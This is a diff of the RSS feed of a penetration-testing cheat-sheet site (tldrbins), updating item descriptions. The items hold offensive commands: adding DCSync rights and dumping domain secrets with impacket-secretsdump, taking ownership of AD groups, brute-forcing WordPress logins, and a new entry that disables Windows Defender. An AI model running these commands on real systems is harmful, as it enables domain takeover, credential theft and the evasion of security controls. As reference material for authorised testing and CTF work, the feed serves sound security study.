-      <description> Abuse #1: Recover data from shadow copies 1. Check vssadmin list shadows 2. Create symlink and expose the volume cmd /c mklink /d C:\VSS &amp;lt;SHADOW_COPY_VOLUME_PATH&amp;gt; 3. Access ls C:\VSS\Users </description>
+      <description> Abuse #1: Recover data from shadow copies Windows 1. Check vssadmin list shadows 2. Create symlink and expose the volume cmd /c mklink /d C:\VSS &amp;lt;SHADOW_COPY_VOLUME_PATH&amp;gt; 3. Access ls C:\VSS\Users </description>
     </item>
     <item>
       <title>VPN</title>
       <link>https://tldrbins.github.io/vpn/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/vpn/</guid>
-      <description> Enum # Check with ikeV1 ike-scan -M &amp;lt;TARGET&amp;gt; # Check with ikeV2 ike-scan -M --ikev2 &amp;lt;TARGET&amp;gt; Connect to VPN Tools sudo apt install strongswan Settings # Edit /etc/ipsec.secrets %any : PSK &amp;lt;PASSWORD&amp;gt; # Edit /etc/ipsec.conf (copy from ike-scan result) config setup charondebug=&amp;#34;all&amp;#34; uniqueids=yes strictcrlpolicy=no conn testvpn authby=secret auto=add ike=3des-sha1-modp1024! esp=3des-sha1! type=transport keyexchange=ikev1 left=&amp;lt;LOCAL&amp;gt; right=&amp;lt;TARGET&amp;gt; rightsubnet=&amp;lt;TARGET&amp;gt;[tcp] Connect # Reset ipsec restart # Connect ipsec up testvpn </description>
+      <description> Enum # Check with ikeV1 ike-scan -M &amp;lt;TARGET&amp;gt; # Check with ikeV2 ike-scan -M --ikev2 &amp;lt;TARGET&amp;gt; Connect to VPN strongswan sudo apt install strongswan Settings # Edit /etc/ipsec.secrets %any : PSK &amp;lt;PASSWORD&amp;gt; # Edit /etc/ipsec.conf (copy from ike-scan result) config setup charondebug=&amp;#34;all&amp;#34; uniqueids=yes strictcrlpolicy=no conn testvpn authby=secret auto=add ike=3des-sha1-modp1024! esp=3des-sha1! type=transport keyexchange=ikev1 left=&amp;lt;LOCAL&amp;gt; right=&amp;lt;TARGET&amp;gt; rightsubnet=&amp;lt;TARGET&amp;gt;[tcp] Connect # Reset ipsec restart # Connect ipsec up testvpn </description>
     </item>
     <item>
       <title>Web Directory Enum</title>
       <link>https://tldrbins.github.io/web_directory_enum/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/web_directory_enum/</guid>
-      <description>feroxbuster HTTP feroxbuster -u http://example.com/ --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --dont-extract-links HTTPS feroxbuster -u https://example.com/ -k --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --dont-extract-links Specify Extension feroxbuster -u http://example.com/ --methods=GET,POST --depth=1 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x html, asp, aspx Add trailing slash / to each request feroxbuster -u http://example.com/ -f --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt API Fuzzing feroxbuster -u http://example.com/ --force-recursion -C 404,405 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt wfuzz Fuzzing Number Range wfuzz -z range,1-99 http://example.</description>
+      <description>feroxbuster wfuzz gobuster bfac ds_walk HTTP feroxbuster -u http://example.com/ --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --dont-extract-links HTTPS feroxbuster -u https://example.com/ -k --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --dont-extract-links Specify Extension feroxbuster -u http://example.com/ --methods=GET,POST --depth=1 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x html, asp, aspx Add trailing slash &amp;lsquo;/&amp;rsquo; to each request feroxbuster -u http://example.com/ -f --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt API Fuzzing feroxbuster -u http://example.com/ --force-recursion -C 404,405 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt Fuzzing Number Range wfuzz -z range,1-99 http://example.</description>
     </item>
     <item>
       <title>Webdav</title>
       <link>https://tldrbins.github.io/webdav/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/webdav/</guid>
-      <description> davtest Download davtest&#xA;# Without creds davtest -url http://example.com # With creds davtest -url http://example.com -auth &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt; curl # Rename a remote file curl -X MOVE -H &amp;#39;Destination:http://example.com/test.php&amp;#39; http://example.com/test.txt </description>
+      <description> Tools davtest curl # Without creds davtest -url http://example.com # With creds davtest -url http://example.com -auth &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt; Ref: Download davtest&#xA;# Rename a remote file curl -X MOVE -H &amp;#39;Destination:http://example.com/test.php&amp;#39; http://example.com/test.txt </description>
     </item>
     <item>
       <title>whois</title>
@@ -1090,21 +1083,42 @@
       <link>https://tldrbins.github.io/windows_acls/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/windows_acls/</guid>
-      <description> Window ACLs (Access Control Lists) Check ACLs # Check a file/directory icacls &amp;lt;PATH&amp;gt; # Check all files and directories icacls * /C Grant user full control # cmd cmd.exe /c cacls &amp;lt;FILE&amp;gt; /E /G &amp;lt;USER&amp;gt;:F # powershell icacls &amp;lt;FILE&amp;gt; /grant &amp;lt;USER&amp;gt;:F Change owner (WO) # cmd cmd.exe /c takeown /F &amp;lt;FILE&amp;gt; +---------------------------------------------------+ | F (full access) | | M (modify access) | | RX (read and execute access) | | R (read-only access) | | W (write-only access) | | D (delete) | | RC (read control) | | WDAC (write DAC) | | WO (write owner) | | S (synchronize) | | AS (access system security) | | MA (maximum allowed) | | GR (generic read) | | GW (generic write) | | GE (generic execute) | | GA (generic all) | | RD (read data/list directory) | | WD (write data/add file) | | AD (append data/add subdirectory) | | REA (read extended attributes) | | WEA (write extended attributes) | | X (execute/traverse) | | DC (delete child) | | RA (read attributes) | | WA (write attributes) | | OI (object inherit) | | CI (container inherit) | | IO (inherit only) | | NP (do not propagate inherit) | | I (permission inherited from parent container) | +---------------------------------------------------+ </description>
+      <description> Window ACLs (Access Control Lists) Check ACLs powershell # Check a file/directory icacls &amp;lt;PATH&amp;gt; # Check all files and directories icacls * /C Grant user full control cmd powershell # cmd cmd.exe /c cacls &amp;lt;FILE&amp;gt; /E /G &amp;lt;USER&amp;gt;:F # powershell icacls &amp;lt;FILE&amp;gt; /grant &amp;lt;USER&amp;gt;:F Change owner (WO) cmd # cmd cmd.exe /c takeown /F &amp;lt;FILE&amp;gt; ACLs +---------------------------------------------------+ | F (full access) | | M (modify access) | | RX (read and execute access) | | R (read-only access) | | W (write-only access) | | D (delete) | | RC (read control) | | WDAC (write DAC) | | WO (write owner) | | S (synchronize) | | AS (access system security) | | MA (maximum allowed) | | GR (generic read) | | GW (generic write) | | GE (generic execute) | | GA (generic all) | | RD (read data/list directory) | | WD (write data/add file) | | AD (append data/add subdirectory) | | REA (read extended attributes) | | WEA (write extended attributes) | | X (execute/traverse) | | DC (delete child) | | RA (read attributes) | | WA (write attributes) | | OI (object inherit) | | CI (container inherit) | | IO (inherit only) | | NP (do not propagate inherit) | | I (permission inherited from parent container) | +---------------------------------------------------+ </description>
+    </item>
+    <item>
+      <title>Windows Defender</title>
+      <link>https://tldrbins.github.io/windows_defender/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/windows_defender/</guid>
+      <description> Disable defender Powershell # Disable realtime monitoring Set-MpPreference -DisableRealtimeMonitoring $true # Completely disable defender New-ItemProperty -Path &amp;#34;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&amp;#34; -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force </description>
+    </item>
+    <item>
+      <title>Windows Event Logs</title>
+      <link>https://tldrbins.github.io/windows_event_logs/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/windows_event_logs/</guid>
+      <description> Convert evtx to json evtx_dump ./evtx_dump -o jsonl -t 1 -f Security.json Security.evtx Ref: evtx_dump&#xA;Check number of logs wc -l Security.json Security Check computer name cat Security.json | jq &amp;#39;.Event.System.Computer&amp;#39; -r | sort | uniq -c | sort -nr Overview of event logs cat Security.json | jq &amp;#39;.Event.System.EventID&amp;#39; | sort | uniq -c | sort -nr Check specific event cat Security.json | jq &amp;#39;select(.Event.System.EventID==4624)&amp;#39; </description>
     </item>
     <item>
       <title>Windows RPC</title>
       <link>https://tldrbins.github.io/windows_rpc/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/windows_rpc/</guid>
-      <description> Windows RPC # Show mappings impacket-rpcmap &amp;#39;ncacn_ip_tcp:&amp;lt;TARGET&amp;gt;&amp;#39; IOXIDResolver&#xA;# Get network interface without auth python3 IOXIDResolver.py -t &amp;lt;TARGET&amp;gt; </description>
+      <description>Windows RPC impacket IOXIDResolver # Show mappings impacket-rpcmap &amp;#39;ncacn_ip_tcp:&amp;lt;TARGET&amp;gt;&amp;#39; # Get network interface without auth python3 IOXIDResolver.py -t &amp;lt;TARGET&amp;gt; Ref: IOXIDResolver</description>
+    </item>
+    <item>
+      <title>Winrm from Windows VM</title>
+      <link>https://tldrbins.github.io/winrm_from_windows_vm/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/winrm_from_windows_vm/</guid>
+      <description>Preparation 0. Check Systeminfo # Windows Pro is needed systeminfo 1. Connect to VPN OpenVPN client&#xA;2. Add DNS Server +-----------------------------------------------------------------------------------+ | 1. Go to &amp;#39;Control Panel\Network and Internet\Network and Sharing Center&amp;#39; | | 2. Click &amp;#39;Local Area Connection&amp;#39; | | 3. Go to &amp;#39;Properties&amp;#39; -&amp;gt; &amp;#39;Internet Protocol Version 4 (TCP/IPv4)&amp;#39; -&amp;gt; &amp;#39;Properties&amp;#39; | | 4. Under &amp;#39;General&amp;#39;, check &amp;#39;Obtain an IP address automatically&amp;#39; | | 5. Check &amp;#39;Use the following DNS address&amp;#39; -&amp;gt; &amp;#39;Prefer DNS Server&amp;#39; -&amp;gt; &amp;lt;DC_IP&amp;gt; | +-----------------------------------------------------------------------------------+ 3.</description>
     </item>
     <item>
       <title>Wordpress</title>
       <link>https://tldrbins.github.io/wordpress/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/wordpress/</guid>
-      <description> Default config location /var/www/html/wp-config.php wpscan Get Free API key&#xA;# HTTP wpscan --url http://example.com -e ap,t,tt,u # HTTPS wpscan --url http://example.com -e ap,t,tt,u --disable-tls-checks # You will need an api token to scan vulns wpscan --url http://example.com -e ap,t,tt,u --api-token &amp;lt;API_KEY&amp;gt; # Brute force wp-admin wpscan --url http://example.com --passwords passwords.txt --usernames admin </description>
+      <description>Default config location /var/www/html/wp-config.php Tools wpscan # HTTP wpscan --url http://example.com -e ap,t,tt,u # HTTPS wpscan --url http://example.com -e ap,t,tt,u --disable-tls-checks # You will need an api token to scan vulns wpscan --url http://example.com -e ap,t,tt,u --api-token &amp;lt;API_KEY&amp;gt; # Brute force wp-admin wpscan --url http://example.com --passwords passwords.txt --usernames admin Ref: Get Free API key</description>
     </item>
     <item>
       <title>Writable /etc/passwd</title>
@@ -1118,14 +1132,14 @@
       <link>https://tldrbins.github.io/writedacl/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/writedacl/</guid>
-      <description> Abuse #1: Add dcsync right to user 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = &amp;#34;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#34; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Add dcsync right Add-DomainObjectAcl -PrincipalIdentity &amp;lt;USER&amp;gt; -TargetIdentity &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;TARGET_GROUP&amp;gt;&amp;#39; -Rights DCSync -Credential $cred 4. Secrets dump impacket-secretsdump &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; </description>
+      <description> Abuse #1: Add dcsync right to user Windows 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = &amp;#34;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#34; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Add dcsync right Add-DomainObjectAcl -PrincipalIdentity &amp;lt;USER&amp;gt; -TargetIdentity &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;TARGET_GROUP&amp;gt;&amp;#39; -Rights DCSync -Credential $cred 4. Secrets dump Linux impacket-secretsdump &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; </description>
     </item>
     <item>
       <title>WriteOwner/Own</title>
       <link>https://tldrbins.github.io/writeowner/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/writeowner/</guid>
-      <description>Abuse #1 : Change owner of the group (From Windows) 1. Import PowerView.ps1 . .\PowerView.ps1 2. Change owner Set-DomainObjectOwner -Identity &amp;lt;TARGET_GROUP&amp;gt; -OwnerIdentity &amp;lt;USER&amp;gt; Abuse #2 : Add user to the group (From Windows) 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = &amp;#34;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#34; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Add user to group Add-DomainObjectAcl -TargetIdentity &amp;lt;TARGET_GROUP&amp;gt; -PrincipalIdentity &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -Rights All -DomainController &amp;lt;DC&amp;gt; -Credential $cred Add-DomainGroupMember -Identity &amp;lt;TARGET_GROUP&amp;gt; -Members &amp;lt;USER&amp;gt; -Credential $cred Check Get-DomainGroupMember -Identity &amp;lt;TARGET_GROUP&amp;gt; -Domain &amp;lt;DOMAIN&amp;gt; -DomainController &amp;lt;DC&amp;gt; -Credential $cred | fl MemberName # Or net user &amp;lt;USER&amp;gt; # Exit current sessions or re-login whoami /groups Abuse #2 : Add user to the group (From Linux) 0.</description>
+      <description>Abuse #1 : Change owner of the group Windows 1. Import PowerView.ps1 . .\PowerView.ps1 2. Change owner Set-DomainObjectOwner -Identity &amp;lt;TARGET_GROUP&amp;gt; -OwnerIdentity &amp;lt;USER&amp;gt; Abuse #2 : Add user to the group Linux Windows 0. Install latest impacket (included dacledit.py) git clone https://github.com/fortra/impacket.git cd impacket pip3 install . 1. Add domain object sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; dacledit.py -k &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -principal &amp;lt;USER&amp;gt; -target &amp;lt;TARGET_GROUP&amp;gt; -action write -rights WriteMembers 2. Add group member kinit &amp;lt;USER&amp;gt; sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; net rpc group addmem &amp;lt;TARGET_GROUP&amp;gt; &amp;lt;USER&amp;gt; -U &amp;lt;USER&amp;gt; --use-kerberos=required -S &amp;lt;DC&amp;gt; --no-pass 3.</description>
     </item>
     <item>
       <title>XXE (XML External Entity)</title>
